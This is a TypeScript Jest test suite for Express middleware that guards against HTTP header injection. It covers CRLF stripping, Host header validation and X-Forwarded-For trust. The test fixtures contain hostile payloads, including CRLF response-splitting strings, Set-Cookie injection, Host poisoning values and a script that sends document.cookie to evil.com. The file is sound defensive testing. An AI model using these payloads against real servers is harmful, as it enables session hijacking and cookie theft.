/**
 * Comprehensive Security Tests for Header Injection Protection
 * Tests CRLF injection prevention, Host header validation,
 * X-Forwarded-* header security, and response header sanitization
 *
 * Task 103.9 - HTTP Header Injection Protection Tests
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import {
  sanitizeHeaderValue,
  containsCRLF,
  containsEncodedCRLF,
  containsControlChars,
  validateHostHeader,
  hostValidationMiddleware,
  setHeaderSafe,
  createHeaderProtectionMiddleware,
  validateForwardedHeaders,
  createHeaderInjectionProtectionMiddleware,
  detectHeaderInjection,
  getSanitizedHeaders,
} from '../shared/middleware/header-injection-protection.js';
import type { Request, Response, NextFunction } from 'express';

// Mock Express request and response objects
function createMockRequest(overrides: Partial<Request> = {}): Partial<Request> {
  return {
    headers: {},
    ip: '127.0.0.1',
    socket: { remoteAddress: '127.0.0.1' } as any,
    secure: false,
    ...overrides,
  };
}

function createMockResponse(): {
  res: Partial<Response>;
  statusCode: number;
  jsonBody: any;
  headers: Map<string, string | string[]>;
} {
  const headers = new Map<string, string | string[]>();
  let statusCode = 200;
  let jsonBody: any = null;

  const res: Partial<Response> = {
    status: jest.fn<any>().mockImplementation((code: number) => {
      statusCode = code;
      return res;
    }),
    json: jest.fn<any>().mockImplementation((body: any) => {
      jsonBody = body;
      return res;
    }),
    setHeader: jest.fn<any>().mockImplementation((name: string, value: string | string[]) => {
      headers.set(name, value);
      return res;
    }),
  };

  return { res, statusCode, jsonBody, headers };
}

describe('Header Injection Protection', () => {
  // =========================================================================
  // CRLF Injection Prevention Tests
  // =========================================================================
  describe('CRLF Injection Prevention', () => {
    describe('sanitizeHeaderValue', () => {
      it('should pass through normal strings unchanged', () => {
        expect(sanitizeHeaderValue('normal value')).toBe('normal value');
        expect(sanitizeHeaderValue('application/json')).toBe('application/json');
        expect(sanitizeHeaderValue('Bearer token123')).toBe('Bearer token123');
      });

      it('should remove carriage return characters', () => {
        expect(sanitizeHeaderValue('value\rinjected')).toBe('valueinjected');
        expect(sanitizeHeaderValue('\rstart')).toBe('start');
        expect(sanitizeHeaderValue('end\r')).toBe('end');
      });

      it('should remove line feed characters', () => {
        expect(sanitizeHeaderValue('value\ninjected')).toBe('valueinjected');
        expect(sanitizeHeaderValue('\nstart')).toBe('start');
        expect(sanitizeHeaderValue('end\n')).toBe('end');
      });

      it('should remove CRLF sequences', () => {
        expect(sanitizeHeaderValue('value\r\nX-Injected: malicious')).toBe(
          'valueX-Injected: malicious'
        );
        expect(sanitizeHeaderValue('normal\r\n\r\n<html>body')).toBe('normal<html>body');
      });

      it('should remove null bytes and control characters', () => {
        expect(sanitizeHeaderValue('value\x00null')).toBe('valuenull');
        expect(sanitizeHeaderValue('value\x1fcontrol')).toBe('valuecontrol');
        expect(sanitizeHeaderValue('value\x7fdelete')).toBe('valuedelete');
      });

      it('should handle empty strings and non-strings', () => {
        expect(sanitizeHeaderValue('')).toBe('');
        expect(sanitizeHeaderValue(null as any)).toBe('');
        expect(sanitizeHeaderValue(undefined as any)).toBe('');
        expect(sanitizeHeaderValue(123 as any)).toBe('');
      });

      it('should handle complex injection attempts', () => {
        // HTTP Response Splitting attack
        const attack1 = 'normal\r\nSet-Cookie: session=hijacked\r\n\r\n<script>evil()</script>';
        expect(sanitizeHeaderValue(attack1)).toBe(
          'normalSet-Cookie: session=hijacked<script>evil()</script>'
        );

        // Header injection via multiple CRLF
        const attack2 = '\r\n\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html';
        expect(sanitizeHeaderValue(attack2)).toBe('HTTP/1.1 200 OKContent-Type: text/html');
      });
    });

    describe('containsCRLF', () => {
      it('should detect carriage return', () => {
        expect(containsCRLF('value\rtest')).toBe(true);
        expect(containsCRLF('\r')).toBe(true);
      });

      it('should detect line feed', () => {
        expect(containsCRLF('value\ntest')).toBe(true);
        expect(containsCRLF('\n')).toBe(true);
      });

      it('should detect CRLF sequence', () => {
        expect(containsCRLF('value\r\ntest')).toBe(true);
        expect(containsCRLF('\r\n')).toBe(true);
      });

      it('should return false for clean strings', () => {
        expect(containsCRLF('clean value')).toBe(false);
        expect(containsCRLF('')).toBe(false);
        expect(containsCRLF('with spaces and special chars!@#$%')).toBe(false);
      });

      it('should handle non-string input', () => {
        expect(containsCRLF(null as any)).toBe(false);
        expect(containsCRLF(undefined as any)).toBe(false);
        expect(containsCRLF(123 as any)).toBe(false);
      });
    });

    describe('containsEncodedCRLF', () => {
      it('should detect URL-encoded carriage return', () => {
        expect(containsEncodedCRLF('value%0dtest')).toBe(true);
        expect(containsEncodedCRLF('value%0Dtest')).toBe(true);
        expect(containsEncodedCRLF('%0D')).toBe(true);
      });

      it('should detect URL-encoded line feed', () => {
        expect(containsEncodedCRLF('value%0atest')).toBe(true);
        expect(containsEncodedCRLF('value%0Atest')).toBe(true);
        expect(containsEncodedCRLF('%0A')).toBe(true);
      });

      it('should detect mixed case encoding', () => {
        expect(containsEncodedCRLF('%0d%0a')).toBe(true);
        expect(containsEncodedCRLF('%0D%0A')).toBe(true);
        expect(containsEncodedCRLF('%0d%0A')).toBe(true);
      });

      it('should return false for clean strings', () => {
        expect(containsEncodedCRLF('clean%20value')).toBe(false);
        expect(containsEncodedCRLF('normal string')).toBe(false);
        expect(containsEncodedCRLF('')).toBe(false);
      });

      it('should handle non-string input', () => {
        expect(containsEncodedCRLF(null as any)).toBe(false);
        expect(containsEncodedCRLF(undefined as any)).toBe(false);
      });
    });

    describe('containsControlChars', () => {
      it('should detect null byte', () => {
        expect(containsControlChars('value\x00test')).toBe(true);
      });

      it('should detect various control characters', () => {
        expect(containsControlChars('value\x01test')).toBe(true);
        expect(containsControlChars('value\x1ftest')).toBe(true);
        expect(containsControlChars('value\x7ftest')).toBe(true);
      });

      it('should return false for normal characters', () => {
        expect(containsControlChars('normal text')).toBe(false);
        expect(containsControlChars('special!@#$%^&*()')).toBe(false);
        expect(containsControlChars('')).toBe(false);
      });
    });
  });

  // =========================================================================
  // Host Header Validation Tests
  // =========================================================================
  describe('Host Header Validation', () => {
    describe('validateHostHeader', () => {
      it('should accept localhost by default', () => {
        expect(validateHostHeader('localhost')).toBe(true);
        expect(validateHostHeader('localhost:3000')).toBe(true);
        expect(validateHostHeader('LOCALHOST')).toBe(true);
      });

      it('should accept 127.0.0.1 by default', () => {
        expect(validateHostHeader('127.0.0.1')).toBe(true);
        expect(validateHostHeader('127.0.0.1:8080')).toBe(true);
      });

      it('should accept IPv6 localhost by default', () => {
        expect(validateHostHeader('::1')).toBe(true);
        expect(validateHostHeader('::1:3000')).toBe(true);
      });

      it('should reject unknown hosts', () => {
        expect(validateHostHeader('evil.com')).toBe(false);
        expect(validateHostHeader('malicious.example.org')).toBe(false);
      });

      it('should accept hosts in custom allowlist', () => {
        const allowedHosts = ['api.example.com', 'www.example.com'];
        expect(validateHostHeader('api.example.com', allowedHosts)).toBe(true);
        expect(validateHostHeader('www.example.com', allowedHosts)).toBe(true);
        expect(validateHostHeader('evil.com', allowedHosts)).toBe(false);
      });

      it('should support wildcard subdomain matching', () => {
        const allowedHosts = ['*.example.com'];
        expect(validateHostHeader('api.example.com', allowedHosts)).toBe(true);
        expect(validateHostHeader('www.example.com', allowedHosts)).toBe(true);
        expect(validateHostHeader('deep.nested.example.com', allowedHosts)).toBe(true);
        expect(validateHostHeader('example.com', allowedHosts)).toBe(true);
        expect(validateHostHeader('notexample.com', allowedHosts)).toBe(false);
      });

      it('should strip port number before validation', () => {
        const allowedHosts = ['api.example.com'];
        expect(validateHostHeader('api.example.com:443', allowedHosts)).toBe(true);
        expect(validateHostHeader('api.example.com:8080', allowedHosts)).toBe(true);
      });

      it('should reject hosts with CRLF injection', () => {
        expect(validateHostHeader('localhost\r\nX-Injected: value')).toBe(false);
        expect(validateHostHeader('evil.com\nHost: localhost')).toBe(false);
      });

      it('should reject hosts with control characters', () => {
        expect(validateHostHeader('localhost\x00evil')).toBe(false);
        expect(validateHostHeader('evil\x1fhost')).toBe(false);
      });

      it('should handle empty and null values', () => {
        expect(validateHostHeader('')).toBe(false);
        expect(validateHostHeader(null as any)).toBe(false);
        expect(validateHostHeader(undefined as any)).toBe(false);
      });

      it('should be case-insensitive', () => {
        const allowedHosts = ['API.EXAMPLE.COM'];
        expect(validateHostHeader('api.example.com', allowedHosts)).toBe(true);
        expect(validateHostHeader('Api.Example.Com', allowedHosts)).toBe(true);
      });
    });

    describe('hostValidationMiddleware', () => {
      it('should call next() for valid hosts', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: { host: 'localhost' },
        }) as Request;

        const middleware = hostValidationMiddleware();
        middleware(req, res as Response, next);

        expect(next).toHaveBeenCalled();
      });

      it('should return 400 for invalid hosts', () => {
        const { res, statusCode, jsonBody } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: { host: 'evil.com' },
        }) as Request;

        const middleware = hostValidationMiddleware();
        middleware(req, res as Response, next);

        expect(res.status).toHaveBeenCalledWith(400);
        expect(next).not.toHaveBeenCalled();
      });

      it('should accept custom allowed hosts', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: { host: 'custom.example.com' },
        }) as Request;

        const middleware = hostValidationMiddleware(['custom.example.com']);
        middleware(req, res as Response, next);

        expect(next).toHaveBeenCalled();
      });
    });
  });

  // =========================================================================
  // Safe Header Setting Tests
  // =========================================================================
  describe('Safe Header Setting', () => {
    describe('setHeaderSafe', () => {
      it('should set normal headers unchanged', () => {
        const { res, headers } = createMockResponse();

        setHeaderSafe(res as any, 'X-Custom-Header', 'normal value');

        expect(res.setHeader).toHaveBeenCalledWith('X-Custom-Header', 'normal value');
      });

      it('should sanitize header values with CRLF', () => {
        const { res } = createMockResponse();

        setHeaderSafe(res as any, 'X-Custom', 'value\r\nX-Injected: evil');

        expect(res.setHeader).toHaveBeenCalledWith('X-Custom', 'valueX-Injected: evil');
      });

      it('should sanitize header names', () => {
        const { res } = createMockResponse();

        setHeaderSafe(res as any, 'X-Custom\r\nEvil', 'value');

        expect(res.setHeader).toHaveBeenCalledWith('X-CustomEvil', 'value');
      });

      it('should handle array values', () => {
        const { res } = createMockResponse();

        setHeaderSafe(res as any, 'Set-Cookie', ['cookie1=value1', 'cookie2\r\n=value2']);

        expect(res.setHeader).toHaveBeenCalledWith('Set-Cookie', ['cookie1=value1', 'cookie2=value2']);
      });
    });

    describe('createHeaderProtectionMiddleware', () => {
      it('should wrap res.setHeader to sanitize values', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest() as Request;

        // Store original setHeader
        const originalSetHeader = res.setHeader;

        const middleware = createHeaderProtectionMiddleware();
        middleware(req, res as Response, next);

        // Call the wrapped setHeader
        (res as Response).setHeader('X-Test', 'value\r\nEvil: header');

        expect(next).toHaveBeenCalled();
        // The sanitized value should be set
        expect(originalSetHeader).toHaveBeenCalledWith('X-Test', 'valueEvil: header');
      });
    });
  });

  // =========================================================================
  // X-Forwarded-* Header Validation Tests
  // =========================================================================
  describe('X-Forwarded-* Header Validation', () => {
    describe('validateForwardedHeaders', () => {
      it('should use direct connection values when not from trusted proxy', () => {
        const req = createMockRequest({
          headers: {
            'x-forwarded-for': '10.0.0.100',
            'x-forwarded-proto': 'https',
          },
          socket: { remoteAddress: '192.168.1.100' } as any,
          secure: false,
        }) as Request;

        const result = validateForwardedHeaders(req);

        expect(result.ip).toBe('192.168.1.100');
        expect(result.proto).toBe('http');
        expect(result.isTrustedProxy).toBe(false);
      });

      it('should use forwarded headers from trusted proxy', () => {
        const req = createMockRequest({
          headers: {
            'x-forwarded-for': '203.0.113.50, 10.0.0.1',
            'x-forwarded-proto': 'https',
            'x-forwarded-host': 'api.example.com',
          },
          socket: { remoteAddress: '10.0.0.1' } as any,
          secure: false,
        }) as Request;

        const result = validateForwardedHeaders(req, ['10.0.0.1']);

        expect(result.ip).toBe('203.0.113.50');
        expect(result.proto).toBe('https');
        expect(result.host).toBe('api.example.com');
        expect(result.isTrustedProxy).toBe(true);
      });

      it('should sanitize forwarded header values', () => {
        const req = createMockRequest({
          headers: {
            'x-forwarded-for': '203.0.113.50\r\nX-Evil: header',
            'x-forwarded-proto': 'https\r\n\r\n',
          },
          socket: { remoteAddress: '10.0.0.1' } as any,
        }) as Request;

        const result = validateForwardedHeaders(req, ['10.0.0.1']);

        // IP should be sanitized but since it's invalid after sanitization, falls back
        expect(result.proto).toBe('https');
      });

      it('should only accept valid protocol values', () => {
        const req = createMockRequest({
          headers: {
            'x-forwarded-proto': 'evil-protocol',
          },
          socket: { remoteAddress: '10.0.0.1' } as any,
          secure: true,
        }) as Request;

        const result = validateForwardedHeaders(req, ['10.0.0.1']);

        // Invalid protocol should fall back to connection's secure status
        expect(result.proto).toBe('https');
      });

      it('should handle IPv6-mapped IPv4 addresses', () => {
        const req = createMockRequest({
          headers: {
            'x-forwarded-for': '203.0.113.50',
          },
          socket: { remoteAddress: '::ffff:10.0.0.1' } as any,
        }) as Request;

        const result = validateForwardedHeaders(req, ['10.0.0.1']);

        expect(result.isTrustedProxy).toBe(true);
      });

      it('should extract first IP from X-Forwarded-For chain', () => {
        const req = createMockRequest({
          headers: {
            'x-forwarded-for': '203.0.113.50, 198.51.100.10, 10.0.0.1',
          },
          socket: { remoteAddress: '10.0.0.1' } as any,
        }) as Request;

        const result = validateForwardedHeaders(req, ['10.0.0.1']);

        expect(result.ip).toBe('203.0.113.50');
      });
    });
  });

  // =========================================================================
  // Comprehensive Middleware Tests
  // =========================================================================
  describe('Comprehensive Header Injection Protection Middleware', () => {
    describe('createHeaderInjectionProtectionMiddleware', () => {
      it('should allow clean requests through', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'localhost',
            referer: 'https://localhost/page',
            'user-agent': 'Mozilla/5.0',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware();
        middleware(req, res as Response, next);

        expect(next).toHaveBeenCalled();
      });

      it('should block requests with CRLF in headers', () => {
        const { res, statusCode, jsonBody } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'localhost',
            referer: 'https://example.com\r\nX-Injected: evil',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware();
        middleware(req, res as Response, next);

        expect(next).not.toHaveBeenCalled();
        expect(res.status).toHaveBeenCalledWith(400);
      });

      it('should block requests with encoded CRLF in headers', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'localhost',
            referer: 'https://example.com%0d%0aX-Injected: evil',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware();
        middleware(req, res as Response, next);

        expect(next).not.toHaveBeenCalled();
        expect(res.status).toHaveBeenCalledWith(400);
      });

      it('should block requests with control characters in headers', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'localhost',
            cookie: 'session=abc\x00def',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware();
        middleware(req, res as Response, next);

        expect(next).not.toHaveBeenCalled();
        expect(res.status).toHaveBeenCalledWith(400);
      });

      it('should block requests with invalid Host header', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'evil.com',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware();
        middleware(req, res as Response, next);

        expect(next).not.toHaveBeenCalled();
        expect(res.status).toHaveBeenCalledWith(400);
      });

      it('should respect validateHost: false option', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'any-host.com',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware({
          validateHost: false,
        });
        middleware(req, res as Response, next);

        expect(next).toHaveBeenCalled();
      });

      it('should attach forwarded headers info to request', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'localhost',
            'x-forwarded-for': '203.0.113.50',
          },
          socket: { remoteAddress: '10.0.0.1' } as any,
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware({
          trustedProxies: ['10.0.0.1'],
        });
        middleware(req, res as Response, next);

        expect((req as any).forwardedHeaders).toBeDefined();
        expect((req as any).forwardedHeaders.ip).toBe('203.0.113.50');
      });

      it('should use custom error handler', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const customErrorHandler = jest.fn();
        const req = createMockRequest({
          headers: {
            host: 'evil.com',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware({
          onError: customErrorHandler,
        });
        middleware(req, res as Response, next);

        expect(customErrorHandler).toHaveBeenCalled();
        expect(next).not.toHaveBeenCalled();
      });

      it('should wrap setHeader when wrapSetHeader is true', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: { host: 'localhost' },
        }) as Request;

        const originalSetHeader = res.setHeader;

        const middleware = createHeaderInjectionProtectionMiddleware({
          wrapSetHeader: true,
        });
        middleware(req, res as Response, next);

        // setHeader should be wrapped
        expect(res.setHeader).not.toBe(originalSetHeader);
      });

      it('should check additional headers when configured', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'localhost',
            'x-custom-header': 'value\r\ninjected',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware({
          additionalHeadersToCheck: ['x-custom-header'],
        });
        middleware(req, res as Response, next);

        expect(next).not.toHaveBeenCalled();
        expect(res.status).toHaveBeenCalledWith(400);
      });

      it('should skip encoded CRLF check when disabled', () => {
        const { res } = createMockResponse();
        const next = jest.fn() as NextFunction;
        const req = createMockRequest({
          headers: {
            host: 'localhost',
            referer: 'https://example.com%0d%0atest',
          },
        }) as Request;

        const middleware = createHeaderInjectionProtectionMiddleware({
          checkEncodedCRLF: false,
        });
        middleware(req, res as Response, next);

        expect(next).toHaveBeenCalled();
      });
    });
  });

  // =========================================================================
  // Utility Function Tests
  // =========================================================================
  describe('Utility Functions', () => {
    describe('detectHeaderInjection', () => {
      it('should detect CRLF injection attempts', () => {
        const req = createMockRequest({
          headers: {
            referer: 'https://example.com\r\nX-Injected: evil',
            origin: 'https://safe.com',
          },
        }) as Request;

        const result = detectHeaderInjection(req);

        expect(result.detected).toBe(true);
        expect(result.details).toContain('CRLF in referer');
      });

      it('should detect encoded CRLF injection attempts', () => {
        const req = createMockRequest({
          headers: {
            referer: 'https://example.com%0d%0aX-Injected',
          },
        }) as Request;

        const result = detectHeaderInjection(req);

        expect(result.detected).toBe(true);
        expect(result.details).toContain('Encoded CRLF in referer');
      });

      it('should detect control character injection attempts', () => {
        const req = createMockRequest({
          headers: {
            cookie: 'session=abc\x00def',
          },
        }) as Request;

        const result = detectHeaderInjection(req);

        expect(result.detected).toBe(true);
        expect(result.details).toContain('Control characters in cookie');
      });

      it('should return false for clean requests', () => {
        const req = createMockRequest({
          headers: {
            referer: 'https://example.com/page',
            origin: 'https://example.com',
            'user-agent': 'Mozilla/5.0',
          },
        }) as Request;

        const result = detectHeaderInjection(req);

        expect(result.detected).toBe(false);
        expect(result.details).toHaveLength(0);
      });
    });

    describe('getSanitizedHeaders', () => {
      it('should return sanitized versions of all headers', () => {
        const req = createMockRequest({
          headers: {
            'x-clean': 'clean value',
            'x-dirty': 'value\r\ninjected',
            'x-null': 'value\x00null',
          },
        }) as Request;

        const result = getSanitizedHeaders(req);

        expect(result['x-clean']).toBe('clean value');
        expect(result['x-dirty']).toBe('valueinjected');
        expect(result['x-null']).toBe('valuenull');
      });

      it('should handle array header values', () => {
        const req = createMockRequest({
          headers: {
            'set-cookie': ['cookie1=value1', 'cookie2\r\n=value2'] as any,
          },
        }) as Request;

        const result = getSanitizedHeaders(req);

        expect(result['set-cookie']).toBe('cookie1=value1, cookie2=value2');
      });
    });
  });

  // =========================================================================
  // Attack Scenario Simulations
  // =========================================================================
  describe('Attack Scenario Simulations', () => {
    it('should prevent HTTP Response Splitting attack', () => {
      const { res } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const req = createMockRequest({
        headers: {
          host: 'localhost',
          // Classic HTTP Response Splitting payload
          cookie: 'user=admin\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>document.location="http://evil.com?"+document.cookie</script>',
        },
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware();
      middleware(req, res as Response, next);

      expect(next).not.toHaveBeenCalled();
      expect(res.status).toHaveBeenCalledWith(400);
    });

    it('should prevent Host header poisoning for password reset', () => {
      const { res } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const req = createMockRequest({
        headers: {
          // Attacker tries to poison host header for password reset link
          host: 'evil.com',
        },
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware();
      middleware(req, res as Response, next);

      expect(next).not.toHaveBeenCalled();
    });

    it('should prevent cache poisoning via Host header', () => {
      const { res } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const req = createMockRequest({
        headers: {
          // Multiple Host headers for cache poisoning
          host: 'attacker.com\r\nHost: legitimate.com',
        },
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware();
      middleware(req, res as Response, next);

      expect(next).not.toHaveBeenCalled();
    });

    it('should prevent IP spoofing via X-Forwarded-For', () => {
      const req = createMockRequest({
        headers: {
          'x-forwarded-for': '127.0.0.1', // Attacker tries to appear as localhost
        },
        socket: { remoteAddress: '203.0.113.100' } as any, // Real IP
      }) as Request;

      // No trusted proxies configured
      const result = validateForwardedHeaders(req);

      // Should use real IP, not spoofed header
      expect(result.ip).toBe('203.0.113.100');
      expect(result.isTrustedProxy).toBe(false);
    });

    it('should prevent XSS via response header injection', () => {
      const { res, headers } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const req = createMockRequest({
        headers: { host: 'localhost' },
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware();
      middleware(req, res as Response, next);

      // After middleware, try to set header with XSS payload
      (res as Response).setHeader(
        'X-User-Input',
        'value\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>'
      );

      // The wrapped setHeader should sanitize the value
      const calls = (res.setHeader as jest.Mock).mock.calls;
      const lastCall = calls[calls.length - 1];

      // Value should be sanitized
      expect(lastCall[1]).not.toContain('\r\n');
    });

    it('should prevent session fixation via Set-Cookie header injection', () => {
      const { res } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const req = createMockRequest({
        headers: {
          host: 'localhost',
          // Attacker tries to inject Set-Cookie header
          referer: 'https://example.com\r\nSet-Cookie: session=attacker-controlled',
        },
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware();
      middleware(req, res as Response, next);

      expect(next).not.toHaveBeenCalled();
      expect(res.status).toHaveBeenCalledWith(400);
    });
  });

  // =========================================================================
  // Edge Cases and Error Handling
  // =========================================================================
  describe('Edge Cases and Error Handling', () => {
    it('should handle missing headers gracefully', () => {
      const { res } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const req = createMockRequest({
        headers: {},
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware({
        validateHost: false, // Skip host validation for this test
      });
      middleware(req, res as Response, next);

      expect(next).toHaveBeenCalled();
    });

    it('should handle very long header values', () => {
      const { res } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const longValue = 'a'.repeat(10000);
      const req = createMockRequest({
        headers: {
          host: 'localhost',
          'x-custom': longValue,
        },
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware();
      middleware(req, res as Response, next);

      expect(next).toHaveBeenCalled();
    });

    it('should handle unicode in headers', () => {
      const { res } = createMockResponse();
      const next = jest.fn() as NextFunction;
      const req = createMockRequest({
        headers: {
          host: 'localhost',
          'accept-language': 'zh-CN,zh;q=0.9',
        },
      }) as Request;

      const middleware = createHeaderInjectionProtectionMiddleware();
      middleware(req, res as Response, next);

      expect(next).toHaveBeenCalled();
    });

    it('should handle requests with missing socket info', () => {
      const req = createMockRequest({
        headers: {},
        socket: undefined as any,
        ip: '10.0.0.100',
      }) as Request;

      const result = validateForwardedHeaders(req);

      expect(result.ip).toBe('10.0.0.100');
    });
  });
});
